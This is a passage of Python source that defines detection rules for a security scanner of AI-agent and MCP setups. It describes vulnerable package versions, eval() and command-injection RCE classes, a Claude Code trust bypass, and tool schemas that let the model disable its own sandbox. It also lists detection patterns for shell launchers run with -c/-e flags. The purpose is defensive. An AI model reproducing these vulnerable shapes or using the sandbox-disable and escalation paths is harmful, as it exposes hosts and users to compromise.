    "OpenAPI operation with >12 parameters or >24 request-body properties (Hermes BLOATED)",
    "An OpenAPI 3.x operation declares more than 12 `parameters` "
    "or more than 24 `requestBody` schema properties. Per Hermes "
    "(arXiv:2605.14312), bloated operations exceed the working-"
    "memory budget of mainstream LLM tool-callers (typical "
    "context budget per tool: 8-12 fields) and cause partial-"
    "argument hallucination or skipped operations. Affects MCP "
    "servers that auto-generate tools from a CRUD REST API.",
    Severity.LOW,
    Category.TOOL_POISONING,
    "Decompose the operation into smaller MCP tools, each owning "
    "<=12 parameters, OR split the request body into nested "
    "sub-operations. If the breadth is required, expose a "
    "structured-output schema that the agent can consult before "
    "the call.",
    sarif_name="OpenApiBloatedParameters",
    incident_references=["ARXIV-2605.14312"],
    limitations=(
        "Counts the entries of an operation's own `parameters` list and the "
        "`properties` of an inline request-body schema. A request body whose schema "
        "is a `$ref` into `components`, and parameters declared once at the path "
        "level, are not counted, and the spec must be at the project root or under "
        "a top-level `api/`, `openapi/`, `spec/` or `docs/api/` folder "
        "(`backend/openapi.yaml` is not found)."
    ),
)

_r(
    "AAK-MCP-OPENAPI-TANGLED-METHODS-001",
    "OpenAPI path serving >4 HTTP methods or method-name/path semantic contradiction (Hermes TANGLED)",
    "An OpenAPI 3.x path operates as >4 HTTP methods (e.g. GET + "
    "POST + PUT + PATCH + DELETE all on the same path), OR the "
    "HTTP method contradicts the path segment (e.g. POST /get/... "
    "or GET /create/...). Per Hermes (arXiv:2605.14312), tangled "
    "path-and-method semantics confuse agents that infer operation "
    "intent from the path string. Side-effect-misclassification "
    "is the realized failure mode.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Split the tangled path into >=2 disjoint paths, each owning "
    "<=4 methods with method-name and path-segment in semantic "
    "agreement. Reserve verbs (`/get/...`, `/create/...`) for "
    "their corresponding HTTP methods only.",
    sarif_name="OpenApiTangledMethodsAndPaths",
    incident_references=["ARXIV-2605.14312"],
    limitations=(
        "Compares only whole path segments with a verb list (`get`, `list`, "
        "`fetch`, `read`, `create`, `add`, `new`, `update`, `edit`, `delete`, "
        "`remove`): `GET /users/create` is reported, but `GET /createUser` and "
        "`POST /users/get-by-email` are not. More than four methods on one path is "
        "the other test."
    ),
)

_r(
    "AAK-MCPCALC-CVE-2026-44717-PIN-001",
    "MCP Calculate Server eval() RCE (CVE-2026-44717, PyPI <0.1.1)",
    "The PyPI package `mcp-calculate-server` <0.1.1 has a remote code "
    "execution vulnerability in its MCP tool handler — the math "
    "expression is routed through `eval()` (SymPy-backed without "
    "`local_dict` / `global_dict` namespace pinning), so an attacker "
    "controlling the tool input reaches host RCE. CVE-2026-44717 "
    "(CVSS 9.8 CRITICAL, NVD 2026-05-15). Patched in 0.1.1 (latest "
    "at AAK ship time: 1.0.0). This pin-only rule fires on the "
    "package in any Python manifest (`requirements*.txt`, "
    "`pyproject.toml`, `Pipfile*`, `poetry.lock`, `uv.lock`). A "
    "broader source-detector for the unsafe-`eval()` shape inside "
    "any `@tool` / `@mcp.tool()` decorated handler is queued for "
    "v0.3.19+ — it would catch single-author MCP servers with the "
    "same shape, not just this product.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `mcp-calculate-server` to >= 0.1.1 (or the latest 1.x). "
    "If you maintain a similar MCP server, replace `eval()` with "
    "`ast.literal_eval` for plain numerics, or SymPy "
    "`parse_expr(expr, local_dict={}, global_dict={}, evaluate=True)` "
    "with explicit allow-listed symbol tables.",
    sarif_name="McpCalculateServerEvalRce",
    cve_references=["CVE-2026-44717"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    incident_references=["NVD-CVE-2026-44717"],
    limitations=(
        "Matches `mcp-calculate-server` followed directly by a version "
        "(`mcp-calculate-server==0.1.0`) in requirements*.txt at the project root "
        "and in a dependency string of the root pyproject.toml. A name with no "
        "version, a git URL, the table form that Poetry and Pipfile use "
        "(`mcp-calculate-server = \"^0.1.0\"`), a requirements file in a "
        "sub-directory and an `.mcp.json` launcher are not reported. Pipfile.lock, "
        "poetry.lock and uv.lock are opened but never match, because the name and "
        "the version sit on separate lines, so a version that reaches the project "
        "only through a lockfile is not reported."
    ),
)

_r(
    "AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001",
    "Microsoft Semantic Kernel InMemoryVectorStore filter RCE (CVE-2026-26030, PyPI <1.39.4)",
    "Microsoft Semantic Kernel Python SDK <1.39.4 has a remote code "
    "execution vulnerability in the `InMemoryVectorStore` filter "
    "functionality — CVE-2026-26030 (CVSS 9.9 CRITICAL). Patched in "
    "`python-1.39.4`. This pin-only rule fires on the PyPI package "
    "`semantic-kernel` < 1.39.4 in any Python manifest "
    "(`requirements*.txt` / `pyproject.toml` / `Pipfile*` / "
    "`poetry.lock` / `uv.lock`). A companion .NET-side disclosure "
    "(file-write in SessionsPythonPlugin, patched in the .NET 1.71.0 "
    "release) is intentionally **out of scope** — AAK does not "
    "currently scan NuGet manifests; only the Python pin shape is "
    "actionable here. Disclosed by MSRC on 2026-05-07.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `semantic-kernel` to >= 1.39.4 in any Python manifest "
    "pinning Semantic Kernel. The rule fires only on the pin shape; "
    "This is a pin-only rule: it matches the dependency pin, not the "
    "`InMemoryVectorStore(filter=...)` construction itself. A source detector "
    "for that shape was scoped for v0.3.18 and has not been written, so a "
    "project that vendors the vulnerable code without pinning the package is "
    "not covered here.",
    sarif_name="SemanticKernelInMemoryVectorStoreFilterRce",
    cve_references=["CVE-2026-26030"],
    owasp_agentic_references=["ASI04", "ASI05"],
    incident_references=["MSRC-2026-05-07"],
    limitations=(
        "Matches `semantic-kernel` followed directly by a version "
        "(`semantic-kernel==1.30.0`) in requirements*.txt at the project root and "
        "in a dependency string of the root pyproject.toml. A name with no version, "
        "a name with extras (`semantic-kernel[all]==1.30.0`), a git URL, the table "
        "form that Poetry and Pipfile use (`semantic-kernel = \"^1.30.0\"`), a "
        "requirements file in a sub-directory and an `.mcp.json` launcher are not "
        "reported. Pipfile.lock, poetry.lock and uv.lock are opened but never "
        "match, because the name and the version sit on separate lines, so a "
        "version that reaches the project only through a lockfile is not reported."
    ),
)

_r(
    "AAK-CLAUDECODE-CVE-2026-40068-PIN-001",
    "Anthropic Claude Code below 2.1.129: folder-trust bypass (CVE-2026-40068) and write-time symlink following (CVE-2026-103435)",
    "Claude Code 2.1.63 → before 2.1.83 derives folder-trust from the "
    "git worktree `commondir` file without validating its contents. A "
    "malicious repo with a crafted `commondir` pointing to a previously-"
    "trusted path silently bypasses the trust prompt — every subsequent "
    "agent run executes inside that fake-trusted scope (CVE-2026-40068, "
    "patched in 2.1.83, published to npm 2026-03-24). Before 2.1.129, "
    "Claude Code checked that a target file was inside the project when "
    "it asked for permission, then re-resolved the path at write time "
    "without checking again, so an attacker who can write to a shared "
    "workspace and wins the race swaps the file for a symlink and "
    "redirects the write to a file outside the project, such as a shell "
    "profile (CVE-2026-103435, CVSS 4.0 7.7, CWE-367, "
    "GHSA-5j29-h97v-84ch). This pin-only rule fires on the scoped npm "
    "package `@anthropic-ai/claude-code` < 2.1.129 in any consumer "
    "manifest, and its evidence names the folder-trust bug only below "
    "2.1.83. Rule name was pre-allocated in the v0.3.15 triage of issue "
    "#181 and shipped in v0.3.16; the floor rose from 2.1.83 on "
    "2026-10-08.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump `@anthropic-ai/claude-code` to >=2.1.129 in any npm "
    "manifest pinning Claude Code. The rule fires only on the pin "
    "shape; an unpinned global install is in no file AAK reads, and "
    "auto-update has delivered both fixes to installs that keep it on.",
    sarif_name="ClaudeCodeFolderTrustBypass",
    cve_references=["CVE-2026-40068", "CVE-2026-103435"],
    owasp_agentic_references=["ASI04", "ASI09"],
    incident_references=["ANTHROPIC-CLAUDECODE-2026-05-06"],
    limitations=(
        "Reads `@anthropic-ai/claude-code` in the root package.json, "
        "package-lock.json, yarn.lock and pnpm-lock.yaml and reports a version it "
        "can parse below 2.1.129, so `latest` and other tags state no version and "
        "are not reported. In package-lock.json it reads only a listed dependency "
        "(`\"@anthropic-ai/claude-code\": \"<version>\"`): an entry that only a "
        "transitive dependency adds under `node_modules/@anthropic-ai/claude-code` "
        "is not read, and neither is a Yarn 2+ yarn.lock, a sub-directory "
        "package.json or a versioned `npx` reference in .mcp.json."
    ),
)

_r(
    "AAK-GPTRESEARCHER-MCP-STDIO-MITM-001",
    "GPT-Researcher MCP transport-flip MITM (OX 2026-05-01, CVE-2025-65720)",
    "Phase 2 sibling of AAK-DOCSGPT-MCP-STDIO-MITM-001 (v0.3.14). "
    "Two-arm detector for assafelovic/gpt-researcher under the OX MCP "
    "2026-05-01 disclosure batch. Arm 1 — pin-check on the PyPI "
    "`gpt-researcher` / `gpt-researcher-mcp` packages (primary surface), "
    "plus npm + GitHub `assafelovic/gpt-researcher` git refs. Latest "
    "PyPI release is 0.14.8 (2026-03-13), pre-disclosure — vendor has "
    "not shipped a post-disclosure fix as of the AAK ship date, so the "
    "rule fires for any pinned version (same `patched_in: None` posture "
    "as astro-mcp / chatgpt-mcp). Arm 2 — server-config scanner "
    "`gpt_researcher_transport_flip.py` that fires when a "
    "GPT-Researcher-named MCP config declares an SSE/HTTP transport but "
    "permits a post-handshake `transport=stdio` override (the MITM "
    "transport-flip path). Configs that explicitly set "
    "`deny_stdio_transport: true` or `allowed_transports: [\"sse\"]` "
    "short-circuit the rule. Architectural receiver-side class is "
    "covered by AAK-MCP-STDIO-CMD-INJ-001 (Python).",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin `gpt-researcher` away from any pre-disclosure version when the "
    "vendor ships a post-2026-05-01 fix (track at "
    "https://github.com/assafelovic/gpt-researcher). That version pin is "
    "the control that actually works today. "
    "For the transport-flip path itself, protect the channel rather than "
    "the config: serve the MCP endpoint over TLS with certificate "
    "verification enabled so a middlebox cannot rewrite the handshake, "
    "and prefer a client that pins the transport it negotiated. "
    "**Note on `deny_stdio_transport` / `allowed_transports`:** this rule "
    "treats those keys as a short-circuit, but they are AgentAuditKit "
    "conventions, not fields the MCP specification defines — they appear "
    "in none of the 748 public MCP configs in this project's corpus. "
    "Adding them silences this rule and is ignored by your MCP client, so "
    "do not treat their presence as protection.",
    sarif_name="GptResearcherMcpTransportFlip",
    cve_references=["CVE-2025-65720"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    incident_references=["OX-MCP-2026-05-01"],
    limitations=(
        "Two arms. The pin reads `gpt-researcher` and `gpt-researcher-mcp` followed "
        "directly by a version in the root requirements*.txt and pyproject.toml, "
        "and in the root npm manifests, and reports every version because no fix "
        "exists. A name with no version, a requirements file in a sub-directory, a "
        "version recorded only in uv.lock (name and version sit on separate lines) "
        "and a `gptresearcher/gpt-researcher` image tag in a compose file are not "
        "reported. The config arm reads JSON MCP configs (.mcp.json, mcp.json, "
        "`.cursor/mcp.json`, `.vscode/mcp.json`), gpt-researcher's own config files "
        "at the root and in `.gpt-researcher/`, and the .json files of a top-level "
        "`configs/`, and reports one that names gpt-researcher, declares an sse, "
        "http, https or streamable-http transport and enables stdio explicitly "
        "(`stdio_fallback`, `transport_override`, `permit_transport_override` or a "
        "`transports` list that includes stdio); the same settings in "
        "`deploy/gpt-researcher.config.json` are not reported."
    ),
)

_r(
    "AAK-DOCSGPT-MCP-STDIO-MITM-001",
    "DocsGPT MCP transport-flip MITM (OX 2026-05-01, CVE-2026-26015 family)",
    "Two-arm detector for the OX MCP 2026-05-01 disclosure batch. "
    "Arm 1 — pin-check on the npm `docsgpt` / `docsgpt-mcp` package, "
    "GitHub `arc53/DocsGPT` git refs in package.json / lockfiles, and "
    "the same package in `pyproject.toml` / `requirements*.txt`. Fires "
    "for any pin below the patched 0.6.4 floor. Arm 2 — server-config "
    "scanner that fires when a DocsGPT MCP config declares a safe "
    "transport (`sse` / `http` / `https`) but permits a post-handshake "
    "`transport=stdio` override (the MITM transport-flip path the "
    "disclosure traced through CVE-2026-26015). The architectural "
    "receiver-side class is already covered by AAK-MCP-STDIO-CMD-INJ-"
    "001/002/003/004 + AAK-STDIO-001 (shipped v0.3.6); this rule adds "
    "the product-named pin row consumers expect when grepping "
    "CHANGELOG.cves.md for 'DocsGPT' plus the transport-flip-resistance "
    "check the receiver-side rules don't catch.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin DocsGPT >= 0.6.4 (the vendor fix from the OX 2026-05-01 batch). "
    "That version pin is the control that actually works today. "
    "For the transport-flip path itself, protect the channel rather than "
    "the config: serve the MCP endpoint over TLS with certificate "
    "verification enabled so a middlebox cannot rewrite the handshake, "
    "and prefer a client that pins the transport it negotiated. The "
    "receiver-side detectors (AAK-MCP-STDIO-CMD-INJ-*, AAK-STDIO-001) "
    "catch the downstream command injection if a flip does succeed. "
    "**Note on `deny_stdio_transport` / `allowed_transports`:** this rule "
    "treats those keys as a short-circuit, but they are AgentAuditKit "
    "conventions, not fields the MCP specification defines — they appear "
    "in none of the 748 public MCP configs in this project's corpus. "
    "Adding them silences this rule and is ignored by your MCP client, so "
    "do not treat their presence as protection.",
    sarif_name="DocsGptMcpTransportFlip",
    cve_references=["CVE-2026-26015"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    incident_references=["OX-MCP-2026-05-01"],
    limitations=(
        "Two arms. The pin reads npm `docsgpt` and `docsgpt-mcp` in the root "
        "package.json, package-lock.json, yarn.lock and pnpm-lock.yaml, and the "
        "name followed directly by a version in the root requirements*.txt and "
        "pyproject.toml, and reports a version below 0.6.4 or any `arc53/DocsGPT` "
        "git reference. A `node_modules/docsgpt` entry that only a transitive "
        "dependency adds to package-lock.json, a version recorded only in uv.lock "
        "(name and version sit on separate lines), a sub-directory package.json and "
        "an `arc53/docsgpt` image tag in a compose file are not read. The config "
        "arm reads JSON MCP configs (.mcp.json, mcp.json, `.cursor/mcp.json`, "
        "`.vscode/mcp.json`), DocsGPT's own config files at the root and in "
        "`.docsgpt/`, and the .json files of a top-level `configs/`, and reports "
        "one that names DocsGPT, declares an sse, http, https or streamable-http "
        "transport and enables stdio explicitly (`stdio_fallback`, "
        "`transport_override`, `permit_transport_override` or a `transports` list "
        "that includes stdio); the same settings in `deploy/docsgpt.config.json` "
        "are not reported."
    ),
)

_r(
    "AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001",
    "chatgpt-mcp-server OS command injection (CVE-2026-7061, npm/git <=0.1.0)",
    "Toowiredd/chatgpt-mcp-server <=0.1.0 has an OS command injection "
    "in `src/services/docker.service.ts` (the MCP/HTTP path). "
    "CVE-2026-7061 (NVD, CVSS 7.3): the package is NOT published to "
    "npm — consumers install via a `git+https://` URL or GitHub "
    "shorthand in package.json. No upstream patch as of the AAK ship "
    "date; every version <=0.1.0 is vulnerable. The architectural "
    "class is also caught by AAK-MCP-STDIO-CMD-INJ-002 (TS-side "
    "stdio cmd-injection taint sink); this pin-only rule is the "
    "named-CVE companion that surfaces a discrete finding for "
    "consumers running pin-check mode and want an actionable "
    "manifest fix.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin away from chatgpt-mcp-server until an upstream patch ships "
    "(track at https://github.com/Toowiredd/chatgpt-mcp-server). For "
    "the runtime shape, AAK-MCP-STDIO-CMD-INJ-002 already fires on "
    "any TS file that constructs a stdio command from network input.",
    sarif_name="ChatGptMcpCmdInjection",
    cve_references=["CVE-2026-7061"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    incident_references=["NVD-CVE-2026-7061"],
    limitations=(
        "Reads the root package.json, package-lock.json, yarn.lock and "
        "pnpm-lock.yaml for a key `\"chatgpt-mcp-server\"` with any value, or for the "
        "`Toowiredd/chatgpt-mcp-server` repository path, and reports every version "
        "because no fix exists. A reference in a sub-directory package.json, a fork "
        "or mirror under another GitHub organisation (`\"gpt\": "
        "\"github:acme/chatgpt-mcp-server\"`) and an `npx` launcher that fetches the "
        "repository from GitHub in .mcp.json are not read."
    ),
)

_r(
    "AAK-AGENT-ZERO-CVE-2026-30624-PIN-001",
    "Agent Zero 0.9.8 MCP-config RCE (CVE-2026-30624, git-only pin)",
    "Agent Zero 0.9.8 executes the `command` and `args` of a user-supplied "
    "JSON MCP server configuration when that config is applied, without "
    "validation or restriction, so a malicious External MCP Servers entry is "
    "remote code execution with the Agent Zero process's privileges "
    "(CVE-2026-30624, CVSS 8.6; disclosed in the OX Security MCP supply-chain "
    "advisory). NVD's CPE scopes the CVE to exactly 0.9.8 and names no fixed "
    "release. Three practical notes for this pin: the repository moved from "
    "`frdel/agent-zero` to `agent0ai/agent-zero`, so both spellings are "
    "matched; the project's version scheme jumped from the 0.9.8 patch line to "
    "1.x in March 2026 and is now on 2.x, so the floor sits at 1.0; and while "
    "`agent-zero` does resolve on PyPI, that distribution is an unrelated "
    "voice-agent framework, so this rule matches git references only and never "
    "the bare distribution name. The architectural class is covered separately "
    "by `AAK-STDIO-001`.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Move the Agent Zero git reference to a 1.0+ tag and pin it explicitly — an "
    "untagged `git+https://` or `github:` reference resolves to whatever HEAD "
    "serves. Independently of the version, do not let untrusted input reach the "
    "External MCP Servers configuration: its `command` and `args` are executed "
    "as given.",
    sarif_name="AgentZeroMcpConfigRce",
    cve_references=["CVE-2026-30624"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-04"],
    incident_references=["NVD-CVE-2026-30624", "OX-MCP-2026-05-01"],
    limitations=(
        "Reads a git reference to `frdel/agent-zero` or `agent0ai/agent-zero` (a "
        "`git+https` URL or `github:` shorthand) in the root requirements*.txt, "
        "pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and lockfiles, and reports one with no tag or a "
        "tag below 1.0. An `agent0ai/agent-zero` image tag in a compose file or "
        "Dockerfile, a `git clone` in a script and a reference in a sub-directory "
        "manifest are not read."
    ),
)

_r(
    "AAK-LITELLM-CVE-2026-30623-PIN-001",
    "LiteLLM pin floor for CVE-2026-30623 (<1.83.7)",
    "A Python manifest (`requirements*.txt`, `pyproject.toml`, "
    "`Pipfile*`, `poetry.lock`, `uv.lock`) pins `litellm` at a "
    "version below 1.83.7. BerriAI/litellm shipped the CVE-2026-30623 "
    "fix in v1.83.7 on 2026-04-30. AAK-MCP-STDIO-CMD-INJ-001 already "
    "covers the source-side architectural shape; this pin-only rule "
    "complements it by surfacing a discrete finding for consumers "
    "who run pin-check mode and need an actionable manifest fix. "
    "The <1.83.7 floor also flags the LiteLLM MCP-proxy CVE cluster, all "
    "in versions below the floor: CVE-2026-12773 (improper authentication "
    "in the MCP proxy `UserAPIKeyAuth`, <=1.59.8), CVE-2026-12774 (SSRF in "
    "MCP server connection testing, <=1.82.2), and CVE-2026-12798 (SSRF in "
    "the MCP OpenAPI spec loader, <=1.82.2). "
    "Wired into `aak fix --cve` so the auto-fixer can rewrite "
    "requirements*.txt entries to `litellm>=1.83.7`.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump `litellm` to >= 1.83.7. `aak fix --cve` rewrites a "
    "requirements*.txt pin in place; `pyproject.toml` / lockfile "
    "edits should go through the project's normal dependency-update "
    "workflow.",
    sarif_name="LitellmCveStaleVersion",
    cve_references=[
        "CVE-2026-30623", "CVE-2026-12773", "CVE-2026-12774", "CVE-2026-12798",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    incident_references=["BERRIAI-LITELLM-2026-04-30"],
    auto_fixable=True,
    limitations=(
        "Matches `litellm` followed directly by a version (`litellm==1.83.0`) in "
        "requirements*.txt at the project root and in a dependency string of the "
        "root pyproject.toml. A name with no version, a name with extras "
        "(`litellm[all]==1.83.0`), a git URL, the table form that Poetry and "
        "Pipfile use (`litellm = \"^1.83.0\"`), a requirements file in a "
        "sub-directory and an `.mcp.json` launcher are not reported. Pipfile.lock, "
        "poetry.lock and uv.lock are opened but never match, because the name and "
        "the version sit on separate lines, so a version that reaches the project "
        "only through a lockfile is not reported. A compose file's "
        "`ghcr.io/berriai/litellm` image tag is not read."
    ),
)

_r(
    "AAK-OPENCLAW-PRIVESC-001",
    "OpenClaw agent role missing or attacker-influenced",
    "`OpenClawAgent(role=...)` is unset, None, or sourced from "
    "untrusted input without `assert_role_allowlisted(role)`. "
    "IronPlate's 2026-04-07 weekly intel flagged a CVSS 9.9 "
    "privilege-escalation in OpenClaw where a missing/forgable role "
    "default lets a prompt-borne agent escalate to admin actions. "
    "Provisional rule pending a public CVE assignment.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Always pass an explicit, allow-listed role to OpenClawAgent. "
    "Wrap the assignment with `aak.checks.openclaw."
    "assert_role_allowlisted(role)`. Pin the OpenClaw version once "
    "the upstream patch ships; the AAK rule will auto-promote from "
    "`provisional` to `confirmed` when "
    "`scripts/refresh_openclaw_status.py` finds a CVE ID.",
    sarif_name="OpenClawPrivesc",
    owasp_agentic_references=["ASI03"],
    incident_references=["IRONPLATE-2026-04-07"],
    limitations=(
        "Fires on `OpenClawAgent(...)` with no `role=` or with `role=None`, whatever "
        "else the file holds, and on a non-constant role when the call's function, or "
        "the file as a whole, contains `request.json` (or `request.body`, "
        "`request.args`, `request.form`, `request.data`, `request.values`, "
        "`request.files`), `os.environ`, `sys.argv`, `user_input` or `llm_input` and "
        "that same scope never calls `assert_role_allowlisted(`. A role passed in as "
        "an ordinary parameter in a file with no such marker (`def build(role)`) is "
        "not reported, and the class imported under another name (`from openclaw "
        "import OpenClawAgent as Agent`) is not recognised."
    ),
)

_r(
    "AAK-MCP-SANDBOX-SELFDISABLE-001",
    "Tool schema exposes an LLM-settable sandbox/isolation-disable parameter",
    "A tool/function JSON schema or MCP tool descriptor declares a parameter "
    "whose name disables or weakens sandboxing/isolation (e.g. "
    "`dangerouslyDisableSandbox`, `disable_sandbox`, `no_sandbox`, "
    "`allow_unsafe`, `skip_isolation`) inside the schema's `properties` — "
    "meaning the LLM, an untrusted principal, can set it in any tool_use "
    "response and turn off the very sandbox that contains tool execution. "
    "This is the CVE-2026-42074 class (OpenClaude < 0.5.1 exposed "
    "`dangerouslyDisableSandbox` in the BashTool input schema; CWE-284 / "
    "CWE-306, CVSS 9.8). A parameter that is genuinely operator-only must "
    "not live in the model-facing input schema; mark it `readOnly: true` or "
    "annotate it `\"x-aak-sandbox-control\": \"ops-only\"` (or "
    "`\"x-llm-settable\": false`) to assert it is set server-side, which "
    "suppresses this finding.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "Remove the sandbox/isolation-disable parameter from the model-facing "
    "tool input schema entirely. If a privileged escape hatch is required, "
    "gate it server-side behind an operator credential — never let it be "
    "populated from a tool_use argument. If the flag is legitimately set "
    "only by the host (never the model), mark the property `readOnly: true` "
    "or annotate it `\"x-aak-sandbox-control\": \"ops-only\"` to document "
    "that it is not LLM-settable.",
    sarif_name="ToolSchemaSandboxSelfDisable",
    cve_references=["CVE-2026-42074"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI05", "ASI10"],
    limitations=(
        "Reads JSON tool schemas (`inputSchema`, `input_schema`, `parameters`) for a "
        "property named like dangerouslyDisableSandbox, disable_sandbox, no_sandbox, "
        "allow_unsafe or skip_isolation. Other names for the same switch "
        "(`bypassSandbox`) are not matched, and a schema written in TypeScript with "
        "zod is not read."
    ),
)

_r(
    "AAK-AGENT-SHARED-RES-AUTHZ-001",
    "Mutating tool on a shared/multi-agent resource lacks a per-actor "
    "authorization parameter",
    "A tool/function/MCP descriptor exposes a mutating operation "
    "(delete / remove / edit / update / overwrite / move) on a file, record, "
    "or resource that is reachable in a shared or multi-agent context, yet its "
    "input schema carries no owner / actor / authorization / permission field. "
    "Any agent that can call the tool can therefore mutate another principal's "
    "resource — there is nothing in the call surface that scopes the action to "
    "the caller. This is the CVE-2026-44654 broken-access-control class "
    "(LibreChat <= 0.8.3: a shared-agent editor could delete file records via "
    "`DELETE /api/files` that the owner had reused across multiple agents; "
    "CWE-863 Incorrect Authorization, CVSS 8.1). The shared context is "
    "inferred from a multi-agent config (an `agents` collection with >1 "
    "member, or a `shared` / `scope: shared|workspace|team` marker) or from "
    "shared-resource language in the tool's own name/description.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Add and enforce a per-actor authorization parameter (e.g. `owner_id`, "
    "`actor`, `on_behalf_of`, `authorization`) and check it server-side so a "
    "tool call can only mutate resources the calling principal owns. Do not "
    "rely on the agent to self-restrict. If the resource is genuinely global "
    "and every agent is authorized to mutate it, annotate the tool "
    "`\"x-aak-shared-authz\": \"global-ok\"` to document the decision and "
    "suppress this finding.",
    sarif_name="SharedResourceMissingActorAuthz",
    cve_references=["CVE-2026-44654"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    limitations=(
        "Reads JSON files only, taking a tool's `name` and `description` from keys "
        "written in exactly that case (a `\"Description\"` key hides the text), and "
        "matches words in any case. It fires on a tool whose name and description "
        "contain one of delete, remove, edit, update, overwrite or move as a whole "
        "word and one of file, record, resource, document, doc, entry, item, object, "
        "row, entity, note, message, artifact, dataset, memory, conversation or thread "
        "with at most a trailing s (`files`, not `entries`), when the file declares a "
        "shared context (`shared: true`, more than one agent, or a `scope` of shared, "
        "workspace, team, org or organization) or the tool's own text contains shared, "
        "multi-agent, cross-agent, team (as a whole word), workspace, collaborat*, "
        "other agents, reused across, org-wide or tenant (with `_`, `-` or nothing "
        "inside multi-agent, cross-agent and org-wide), and no property name contains "
        "owner, actor, principal, author, user_id, caller, authoriz*, permission, "
        "tenant, requested_by, on_behalf, requester or subject_id (with `_`, `-` or "
        "nothing between the words) or the whole word acl. Not reported: a description "
        "in the third person (`Deletes a file shared with the team`), which has no "
        "whole-word verb; a tool with any of those property names, whether or not its "
        "handler enforces it; a tool described without the shared words; and a tool "
        "declared in Python source."
    ),
)

_r(
    "AAK-MCP-STDIO-LAUNCHER-INJECT-001",
    "MCP stdio server launches a shell-style interpreter with an exec flag "
    "or interpolated args",
    "An MCP stdio server definition (`command` + `args` in a `.mcp.json` / "
    "`mcpServers` block) launches a shell-style interpreter "
    "(`npx`, `node`, `bash`, `sh`, `python`) with a code-execution flag "
    "(`-c`, `-e`, `--eval`), or passes an arg carrying a template / "
    "interpolation token (`${...}` embedded in a larger string, `{{...}}`, "
    "`%s`) that is not a pinned static literal. Either shape turns the "
    "launched process into an arbitrary-code sink the moment the value is "
    "attacker- or model-influenced. This is the CVE-2026-40933 class "
    "(Flowise < 3.1.0 unsafely serialised stdio commands in its MCP adapter "
    "— an authenticated actor could register an stdio server whose "
    "allowlisted launcher, e.g. `npx`, was combined with `-c` to run "
    "arbitrary OS commands; CWE-78, CVSS 9.9). Distinct from AAK-MCP-002 "
    "(which inspects only the `command` string for `sh -c`/`bash -c` "
    "wrappers and shell metacharacters, never `args`) and from the "
    "source-code taint rules AAK-MCP-STDIO-CMD-INJ-001..004 (which model "
    "`StdioServerParameters(command=tainted)` in Python/TS/Java/Rust). A "
    "standalone env reference (`${VAR}`) is treated as pinned and does not "
    "fire.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Do not launch interpreters with `-c`/`-e`/`--eval` from an MCP stdio "
    "definition. Pin `command` to a concrete server executable and pass only "
    "static, literal `args` (e.g. `[\"--port\", \"8080\"]`). If a value must "
    "vary, use a standalone env reference (`${VAR}`) resolved by the host — "
    "never interpolate model- or request-derived strings into the argv. "
    "Enforce a strict argv allowlist server-side. See AAK-MCP-002 and "
    "AAK-FLOWISE-001 for related angles on the same RCE class.",
    sarif_name="McpStdioLauncherInjection",
    cve_references=["CVE-2026-40933"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Fires when the launcher is npx, node, bash, sh, python or python3 and an "
        "argument is exactly `-c`, `-e`, `-eval` or `--eval`, or when any argument "
        "contains `{{...}}`, `%s` or a `${...}` that is not exactly `${NAME}` (a "
        "letter or underscore, then letters, digits or underscores), such as "
        "`x-${KEY}` or `${KEY:-x}`; a VS Code variable (`${workspaceFolder}`, "
        "`${userHome}`, `${env:...}`, `${input:...}` and the others VS Code "
        "documents) does not count, since VS Code substitutes it itself. Combined "
        "short flags (`bash -lc \"...\"`) and other shells (`zsh -c`) are not "
        "matched."
    ),
)

_r(
    "AAK-MCP-TOOLGATE-ASYMMETRY-001",
    "MCP tool gate enforced in tools/list but not tools/call",
    "An MCP server gates tools by an allowlist / read-only / "
    "non-destructive control (e.g. `ALLOWED_TOOLS`, "
    "`ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS`, a `*READONLY*` / "
    "`*NON_DESTRUCTIVE*` env var or config) and applies that check in the "
    "tool-discovery handler (`tools/list` / `list_tools` / "
    "`ListToolsRequestSchema`) but NOT in the execution handler "
    "(`tools/call` / `call_tool` / `CallToolRequestSchema`). A client that "
    "skips discovery and calls a hidden tool name directly bypasses the "
    "control entirely — the gate is cosmetic. This is the CVE-2026-46519 "
    "class (mcp-server-kubernetes < 3.6.0 documented three env vars as "
    "access controls but enforced them only at the discovery layer; "
    "CWE-863 Incorrect Authorization, CVSS 8.8). This is an "
    "enforcement-layer asymmetry — distinct from AAK-MCPWN-001, which is a "
    "transport-middleware route asymmetry (`/mcp_message` vs `/mcp`). Do "
